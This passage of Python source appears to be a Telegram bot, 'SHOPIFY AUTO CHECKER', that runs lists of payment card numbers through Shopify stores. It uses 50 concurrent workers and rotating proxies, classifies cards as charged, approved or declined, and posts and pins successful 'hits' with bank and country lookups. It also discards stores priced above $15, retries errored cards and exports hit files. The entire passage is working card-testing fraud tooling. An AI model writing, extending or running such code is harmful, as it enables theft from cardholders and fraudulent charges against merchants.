                else: session['declined'] += 1
                session['checked'] += 1
                
                if status in ['Charged', 'Approved']:
                    brand, btype, level, bank, country, flag = await get_bin_info(cc)
                    emoji = "🔥" if status == 'Charged' else "✅"
                    hit_text = f"""<b>🔹 SHOPIFY {status.upper()}</b> {emoji}
- - - - - - - - - - - - - - - - - - - - - - -
💳 <b>Card:</b> <code>{cc}</code>
📝 <b>Status:</b> <code>{res_msg}</code>
💰 <b>Price:</b> <code>{res_price}</code>
- - - - - - - - - - - - - - - - - - - - - - -
ℹ️ <b>BIN Info:</b> {brand} - {btype} - {level}
🏦 <b>Bank:</b> {bank}
🌍 <b>Country:</b> {country} {flag}
- - - - - - - - - - - - - - - - - - - - - - -
⌤ <b>Dev by: @XVNZX - 🍀</b>"""
                    session['hit_list'].append(f"{cc} | {site} | {res_msg} | {status} {res_price}")
                    hit_msg = await safe_respond(event, premium_emoji(hit_text), parse_mode='html')
                    if status == 'Charged':
                        try: await bot.pin_message(event.chat_id, hit_msg)
                        except: pass
                
                now = time.time()
                if now - session['last_update'] >= 5.0 or session['checked'] >= total:
                    async with update_lock:
                        if now - session['last_update'] >= 5.0 or session['checked'] >= total:
                            session['last_update'] = now
                            error_log = ""
                            if session['error_cards']:
                                latest_errors = session['error_cards'][-3:]
                                error_log = "\n⚠️ <b>Recent Errors:</b>\n" + "\n".join([f"<code>{ec}</code>" for ec in latest_errors]) + "\n- - - - - - - - - - - - - - - - - - - - - - -"
                            
                            dash = f"""⚙️ SHOPIFY AUTO CHECKER
- - - - - - - - - - - - - - - - - - - - - - -
🌐 Site: <code>{site}</code> (${res_price})
⚡ Card: <code>{cc}</code>
⚡ Status: <code>{res_msg}</code>
⌛ Time: <code>{int(now - session['start_time'])}s</code>
- - - - - - - - - - - - - - - - - - - - - - -{error_log}
✅ Approved: {session['approved']} | 🔥 Charged: {session['charged']}
❌ Declined: {session['declined']} | ⚠️ Error: {session['errors']}
⌛ Progress: {session['checked']}/{total}
- - - - - - - - - - - - - - - - - - - - - - -
⌤ 𝐃𝐞𝐯 𝐛𝐲: @XVNZX - 🍀"""
                            btns = [[Button.inline(f"✅ {session['approved']}", b"i"), Button.inline(f"🔥 {session['charged']}", b"i"), Button.inline(f"❌ {session['declined']}", b"i"), Button.inline(f"⚠️ {session['errors']}", b"i")], [Button.inline("🛑 STOP", b"stop_check")]]
                            # Non-blocking update
                            asyncio.create_task(safe_edit(session['dashboard_msg'], premium_emoji(dash), buttons=btns, parse_mode='html'))
            except:
                session['checked'] += 1
                session['errors'] += 1
            finally: queue.task_done()

    tasks = [asyncio.create_task(worker()) for _ in range(50)]
    session['tasks'] = tasks
    await asyncio.gather(*tasks)
    
    charged, approved, declined, errors = session['charged'], session['approved'], session['declined'], session['errors']
    hit_list, error_cards = session['hit_list'], session['error_cards']
    active_sessions.pop(user_id, None)
    
    hits_file = f"hits_{int(time.time())}.txt"
    with open(hits_file, "w") as f: f.write("\n".join(hit_list) if hit_list else "No hits found.")
    
    retry_sessions[user_id] = {'error_cards': error_cards, 'f_sites': valid_sites}
    retry_btns = [[Button.inline(f"🔄 Retry Errors ({len(error_cards)})", b"retry_errors")]] if error_cards else None
    summary = f"""✅ <b>Bulk Check Done!</b>\n🔥 Charged: {charged}\n✅ Approved: {approved}\n❌ Declined: {declined}\n⚠️ Error: {errors}"""
    await safe_respond(event, premium_emoji(summary), file=hits_file, buttons=retry_btns, parse_mode='html')
    os.remove(hits_file)

@bot.on(events.CallbackQuery(data=b"retry_errors"))
async def retry_errors_cb(event):
    user_id = event.sender_id
    r_session = retry_sessions.get(user_id)
    if not r_session or not r_session.get('error_cards'):
        return await event.answer("⚠️ No error cards to retry!", alert=True)
    
    cards = r_session['error_cards']
    f_sites = r_session.get('f_sites', load_sites_detailed())
    try: await event.delete()
    except: pass
    
    dashboard_msg = await event.respond(premium_emoji(f"🚀 Retrying <b>{len(cards)}</b> error cards..."), parse_mode='html')
    active_sessions[user_id] = {
        'charged': 0, 'approved': 0, 'declined': 0, 'errors': 0, 'checked': 0,
        'hit_list': [], 'error_cards': [], 'start_time': time.time(),
        'cancelled': False, 'tasks': [], 'last_update': 0,
        'dashboard_msg': dashboard_msg, 'f_sites': f_sites
    }
    session = active_sessions[user_id]
    
    total = len(cards)
    proxies = load_proxies()
    queue = asyncio.Queue()
    for i, cc in enumerate(cards): queue.put_nowait((i, cc))
    update_lock = asyncio.Lock()
    
    async def worker():
        while not session.get('cancelled'):
            try:
                try:
                    idx, cc = queue.get_nowait()
                except asyncio.QueueEmpty:
                    break
                
                if not f_sites:
                    session['errors'] += 1
                    session['checked'] += 1
                    continue

                target_obj = f_sites[idx % len(f_sites)]
                site = target_obj['url']
                proxy = proxies[idx % len(proxies)] if proxies else None
                
                try:
                    res = await asyncio.wait_for(check_card(cc, site, proxy=proxy, price=target_obj['price']), timeout=25)
                except asyncio.TimeoutError:
                    res = {'status': 'Error', 'message': 'Timeout'}
                except Exception as e:
                    res = {'status': 'Error', 'message': str(e)}

                actual_price = parse_price_val(str(res.get('price', target_obj['price'])))
                if actual_price > 15.0:
                    await remove_dead_site(site)
                    if target_obj in f_sites:
                        f_sites.remove(target_obj)
                    if f_sites:
                        queue.put_nowait((idx, cc))
                    else:
                        session['errors'] += 1
                        session['checked'] += 1
                    continue

                if session.get('cancelled'): break
                status = res['status']
                res_msg = str(res.get('message', 'No Response'))
                res_price = res.get('price', target_obj['price'])
                
                if status == 'Charged': session['charged'] += 1
                elif status == 'Approved': session['approved'] += 1
                elif status == 'Error': 
                    session['errors'] += 1
                    session['error_cards'].append(cc)
                    if res.get('status_code') not in [429, 403]: 
                        await remove_dead_site(site)
                        if target_obj in f_sites:
                            f_sites.remove(target_obj)
                else: session['declined'] += 1
                session['checked'] += 1
                
                if status in ['Charged', 'Approved']:
                    brand, btype, level, bank, country, flag = await get_bin_info(cc)
                    emoji = "🔥" if status == 'Charged' else "✅"
                    hit_text = f"""<b>🔹 SHOPIFY {status.upper()}</b> {emoji}
- - - - - - - - - - - - - - - - - - - - - - -
💳 <b>Card:</b> <code>{cc}</code>
📝 <b>Status:</b> <code>{res_msg}</code>
💰 <b>Price:</b> <code>{res_price}</code>
- - - - - - - - - - - - - - - - - - - - - - -
ℹ️ <b>BIN Info:</b> {brand} - {btype} - {level}
🏦 <b>Bank:</b> {bank}
🌍 <b>Country:</b> {country} {flag}
- - - - - - - - - - - - - - - - - - - - - - -
⌤ <b>Dev by: @XVNZX - 🍀</b>"""
                    session['hit_list'].append(f"{cc} | {site} | {res_msg} | {status} {res_price}")
                    hit_msg = await safe_respond(event, premium_emoji(hit_text), parse_mode='html')
                    if status == 'Charged':
                        try: await bot.pin_message(event.chat_id, hit_msg)
                        except: pass
                
                now = time.time()
                if now - session['last_update'] >= 5.0 or session['checked'] >= total:
                    async with update_lock:
                        if now - session['last_update'] >= 5.0 or session['checked'] >= total:
                            session['last_update'] = now
                            error_log = ""
                            if session['error_cards']:
                                latest_errors = session['error_cards'][-3:]
                                error_log = "\n⚠️ <b>Recent Errors:</b>\n" + "\n".join([f"<code>{ec}</code>" for ec in latest_errors]) + "\n- - - - - - - - - - - - - - - - - - - - - - -"

                            dash = f"""🚀 <b>SHOPIFY AUTO CHECKER</b>
- - - - - - - - - - - - - - - - - - - - - - -
🌐 <b>Site:</b> <code>{site}</code> (${res_price})
⚡ <b>Card:</b> <code>{cc}</code>
⚡ <b>Status:</b> <code>{res_msg}</code>
⌛ <b>Time:</b> <code>{int(now - session['start_time'])}s</code>
- - - - - - - - - - - - - - - - - - - - - - -{error_log}
✅ <b>Approved:</b> {session['approved']} | 🔥 <b>Charged:</b> {session['charged']}
❌ <b>Declined:</b> {session['declined']} | ⚠️ <b>Error:</b> {session['errors']}
⌛ <b>Progress:</b> {session['checked']}/{total}
- - - - - - - - - - - - - - - - - - - - - - -
⌤ <b>𝐃𝐞𝐯 𝐛𝐲: @XVNZX - 🍀</b>"""
                            btns = [[Button.inline(f"✅ {session['approved']}", b"i"), Button.inline(f"🔥 {session['charged']}", b"i"), Button.inline(f"❌ {session['declined']}", b"i"), Button.inline(f"⚠️ {session['errors']}", b"i")], [Button.inline("🛑 STOP", b"stop_check")]]
                            asyncio.create_task(safe_edit(session['dashboard_msg'], premium_emoji(dash), buttons=btns, parse_mode='html'))
            except:
                session['checked'] += 1
                session['errors'] += 1
            finally: queue.task_done()

    tasks = [asyncio.create_task(worker()) for _ in range(50)]
    session['tasks'] = tasks
    await asyncio.gather(*tasks)
    
    charged, approved, declined, errors = session['charged'], session['approved'], session['declined'], session['errors']
    hit_list, error_cards = session['hit_list'], session['error_cards']
    active_sessions.pop(user_id, None)
    
    hits_file = f"hits_retry_{int(time.time())}.txt"
    if hit_list:
        with open(hits_file, "w") as f: f.write("\n".join(hit_list))
    retry_sessions[user_id] = {'error_cards': error_cards, 'f_sites': f_sites}
    retry_btns = [[Button.inline(f"🔄 Retry Errors ({len(error_cards)})", b"retry_errors")]] if error_cards else None
    summary = f"""✅ <b>Retry Check Done!</b>\n🔥 Charged: {charged}\n✅ Approved: {approved}\n❌ Declined: {declined}\n⚠️ Error: {errors}"""
    
    if hit_list:
        await safe_respond(event, premium_emoji(summary), file=hits_file, buttons=retry_btns, parse_mode='html')
        os.remove(hits_file)
    else:
        await safe_respond(event, premium_emoji(summary), buttons=retry_btns, parse_mode='html')

@bot.on(events.CallbackQuery(data=b"stop_check"))
async def stop_cb(event):
    session = active_sessions.get(event.sender_id)
    if session:
        session['cancelled'] = True
        if 'tasks' in session:
            for t in session['tasks']: t.cancel()
    active_sessions.pop(event.sender_id, None)
    await event.answer("🛑 Stopped!", alert=True)

@bot.on(events.NewMessage(pattern=r'/stats'))
async def stats_cmd(event):
    sites = load_sites_detailed()
    proxies = load_proxies()
    text = f"""📊 <b>CHECKER STATISTICS</b>
- - - - - - - - - - - - - - - - - - - - - - -
🌐 Total Sites: {len(sites)}
🔌 Total Proxies: {len(proxies)}
- - - - - - - - - - - - - - - - - - - - - - -
⌤ 𝐃𝐞𝐯 𝐛𝐲: @XVNZX - 🍀"""
    await event.reply(premium_emoji(text), parse_mode='html')

@bot.on(events.NewMessage())
async def file_handler(event):
    if event.file and not event.text.startswith('/'):
        path = await bot.download_media(event.message)
        with open(path, "r", encoding="utf-8", errors="ignore") as f: content = f.read()
        os.remove(path)
        sites = extract_sites(content)
        if sites:
            await event.reply(premium_emoji(f"🔍 <b>Detected {len(sites)} Shopify sites!</b>\nReply with <code>/site</code> to verify them."), parse_mode='html')

async def main():
    while True:
        try:
            await bot.start(bot_token=BOT_TOKEN)
            print("SHOPIFY AUTO CHECKER is starting...")
            await bot.run_until_disconnected()
            break
        except Exception as e:
            print(f"Connection error: {e}. Retrying in 5 seconds...")
            await asyncio.sleep(5)

if __name__ == '__main__':
    try:
        asyncio.run(main())
    except KeyboardInterrupt:
        pass
    except Exception as e:
        print(f"Fatal error: {e}")

